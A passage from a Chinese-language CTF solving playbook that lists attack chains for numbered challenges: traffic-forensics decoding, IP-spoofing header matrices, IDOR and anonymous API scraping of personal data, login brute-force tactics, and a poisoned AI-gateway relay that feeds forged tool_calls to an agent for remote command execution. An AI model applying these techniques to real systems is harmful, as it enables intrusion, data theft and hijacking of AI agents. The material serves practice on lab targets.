  2. **ICMP 长度信道** → `Counter(payload_length)` 先发现只有两个值（33=0 / 39=1），拼出比特流 → ASCII 得到英文信标 → 串中不含 `- ' \`` 即 base91 特征 → `b91decode` → base64 再解（题 619）；
  3. **DNS 隧道** → `dns.qry.name=<hex分片>.seq-XX.域名`，**按 seq 标签排序拼 hex（不能按抓包顺序）** → ZIP；TXT 记录里是 base64 口令 `CRED`（`cGFzc3dvcmQxMjNAcXdl`）→ WinZip AES 解密 `flag.txt`；**假线索 mDNS `SH00..` 要敢放弃**（题 618）；
  4. **USB HID 键盘** → `linktype=220 usbmon`，头 64B + 8B HID `[mod,res,k1..k6]`；**只用 `submit(0x43)` 报文**（本题无 complete/0x53，别过滤掉全部）；`set(cur)-set(prev)` 新键去重 + `mod&0x22` 判 Shift；取 266bit 按 **7bit** ASCII 解码（`266%8=2` 但 `%7=0`，这就是判据）（题 620）；
  5. **USB HID 鼠标** → 4B 报文 `[button,dx,dy,wheel]`（byte1=dx、byte2=dy，有符号）；累加位移后用 PIL 画轨迹；**x 跨度 1058 vs y 跨度 76 判定哪个轴是 X**；**丢弃起始飞入的长直线**；各向异性拉伸（SX=3, SY=6）（题 648）；
  6. **pcapng 题干直问** → 全流量唯一 53 端口应答方即答案（题 1073）；
  7. **URI 参数分片** → `data=flag%7bjdk` + `token=w_6_wwwf%7`（`%7d` 被截断）→ 按顺序拼接两个片段即得到完整 flag（题 541）。

### 链 35：中转站投毒 RCE

- **认**：AI Gateway / 中转站类应用；接口形如 `POST /agent/run {"relay_url":"...","model":"...","api_key":"..."}`；**`relay_url` 用户可控且无白名单**，服务端对模型返回的 `tool_calls` **零校验**。
- **链**：
  1. 本地起 `ThreadingHTTPServer` 伪造投毒 relay，返回 `choices[0].finish_reason=tool_calls`，`function.arguments={"command":"..."}`；

- **假点**：**必须先确认链路走向**——题 1004 的失败点是"模型返回 `tool_calls` 后第二跳写死 `api.deepseek.com` 并用前端传入的 `api_key` 鉴权"，无有效 Key 必然 401、命令永不执行（已用 `sleep 30` 计时 + 落地文件双验证确认）。所以开工先测"命令到底有没有被执行"（sleep 计时 or 写静态文件再 GET），**不要在 payload shape 上穷举**（该题试了 18 种 `tool_call` shape 全 401）。本机 NAT 不可回连时必须用公网托管/隧道。

### 链 38：IP 头识别链

- **认**：题目要求"让服务端认为你的 IP 是某个值"（如 `SPOOF_IP`），页面直接渲染判定结果；**每道题只认一个头**。
- **链**：头矩阵逐个全试，一次脚本跑完，别手工一个个试。
  `X-Forwarded-For` → `X-Real-IP` → `X-Client-IP` → `True-Client-IP` → `X-Cluster-Client-IP` → `CF-Connecting-IP` → `Proxy-Client-IP` / `WL-Proxy-Client-IP` → `Cdn-Src-Ip` → `Ali-CDN-Real-IP` → `Fastly-Client-IP` → `X-Originating-IP` → `X-Remote-*`。
  实证映射：601 = `X-Forwarded-For`、603 = `X-Real-IP`、604 = `X-Client-IP`、606 = `X-Cluster-Client-IP`、607 = `True-Client-IP`；605 系列未破（50+ 头/变体/组合/query/POST/下划线头全不认）。
- **算成**：服务端渲染出 flag 即通；**同一个头名试一次就够**（这些题不做归一化，认就是认）。
- **假点**：卡点是"头名有变体"和"只在特定位置生效"——试过头矩阵仍不认（605）时，考虑**非标准头名 / query 参数 / POST body / 下划线写法**；判定范围外不要继续投入（该题 12 分钟止损）。
- **来源**：题 601/603/604/606/607/605（报告 1640–1650 行 / 1481 行）。

### 链 39：越权遍历取值

- **认**：接口带自增 ID（`?id=3`、`/api/users/<id>`）；有另一身份（`ROLE_B`）的会话可做对照；分页接口无鉴权。
- **链**：
  1. **IDOR** → `/api/user/profile?id=3` → `bio` 字段藏 flag（题 68）；
  2. **敏感字段前台泄露** → `/driver_certification` 页面的 `value` 字段直接泄露身份证号（readonly 输入框在页面源码里）（题 135）；
  3. **隐藏 API 匿名分页** → `/mycount` 列表页 JS 里挖出 `/jbl/api/module-data/suplinkman_id/page`，匿名 POST 分页拉 PII（题 107，15 行已证实）；
  4. **无身份参数也回显** → `r=member` 不带 `openid` 也回显用户信息（题 113）。
- **算成**：拿到目标身份的私有数据即通；判据是"响应里出现本不该给当前身份看的字段"，不是状态码。
- **假点**：**水平越权与垂直越权是两件事**：改了 ID 能看别人（水平）不代表能进管理功能（垂直），后者常需要转链 6（JWT 伪造）或链 2（拿管理员凭据）。枚举被限流时转链 5（限流绕过）的思路。判分接口可能只认特定字段名，先读 JS。

### 链 40：口令爆破纪律

- **认**：登录接口无锁定/无验证码；失败文案能区分"用户不存在/密码错误"；用户名可能已知（题为 4 位数字口令、系统日志泄露、或题面直给）。
- **链**：
  1. **先读题面再动手** → 题 645 题面直给用户名 `CRED_USER` + `Base32(JSON)` 编码，**无脑字典穷举会浪费 20 分钟**；
  2. **前端加密先复刻** → 读 `encrypt.js`（AES key/IV、Base32 字典），Python 复刻加密逻辑后照常爆破（题 602 AES-CBC、645 Base32 实证：`chinaname.txt × Password.txt` 组合命中 `CRED_USER×CRED_PASS`）；
  3. **官方字典优先** → `dict/Password.txt` + `chinaname.txt` + `common_phones.txt` 三文件交叉（题 602/645/592，592 用 91 词字典第 87 词命中）；
  4. **多字段承载** → 前端 `btoa(username:password)` 放隐藏字段 `auth_data`，POST 时补空 `username=&password=`（题 592）；
  5. **薄容器爆破纪律** → **Session 复用 + 4–6 并发 + 0.2s 节流 + 命中即停 + 失败重试**；串行会打死薄容器（题 149 记录：串行 0 命中、正确姿势 27 分钟命中 `7788`）；
  6. **判定用 UTF-8** → `r.content.decode('utf-8')`，否则中文乱码导致关键字匹配全失效（题 149）。
- **算成**：登录成功并进入 flag 页面即通；"限速提示出现"说明并发过高，降并发重来而不是放弃。
- **假点**：三个坑——① **爆破期间严禁再调 `start`**（题 341：重复 start 导致端口轮换杀环境，100k 字典白跑）；② 登录限速锁的提示注入在 POST 响应体（HTTP 200），会让 302/200 判定失真（题 711）；③ 4 位验证码类爆破可能不成立（题 116 的 `000000-1002999` 未中）。WAF 冷却封禁会用 **401/连接重置伪装**，先隔 60s 复测干净 payload 再下结论（题 637）。
- **来源**：题 149/645/602/592/139/711/341/116/637（报告 79 行、171 行、109 行、1228 行、1230 行、1437 行、1538 行、1595 行、1639–1641 行、1647–1648 行、1652 行、1657 行、1593–1596 行）。
